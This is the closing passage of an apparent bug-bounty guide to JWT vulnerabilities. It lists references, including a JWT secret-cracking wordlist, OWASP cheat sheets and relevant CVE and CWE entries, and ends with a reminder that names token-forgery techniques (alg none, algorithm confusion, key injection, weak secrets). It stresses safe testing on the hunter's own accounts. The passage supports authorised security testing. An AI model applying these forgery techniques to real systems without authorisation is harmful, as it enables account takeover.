jwt-secrets wordlist (wallarm)                     https://github.com/wallarm/jwt-secrets
auth0 "Critical vulnerabilities in JSON Web Token" (background reading)
OWASP JWT / OAuth2 Cheat Sheets                    https://cheatsheetseries.owasp.org/
CVE-2022-21449 (ECDSA psychic signature)           https://nvd.nist.gov/
CWE-347 / CWE-345 / CWE-287 / CWE-639 / CWE-918    https://cwe.mitre.org/
```

---

> **Final reminder — the one rule that pays:** *A JWT is only a finding when the server accepts a token you controlled and acts on it.* Break a verification step (none / confusion / key-injection / weak-secret), make the server treat your token as a more-privileged or different identity, demonstrate it safely on your own accounts (§32), and name the impact in the title (§33). That's how `eyJ...` becomes the bounty it's actually worth.
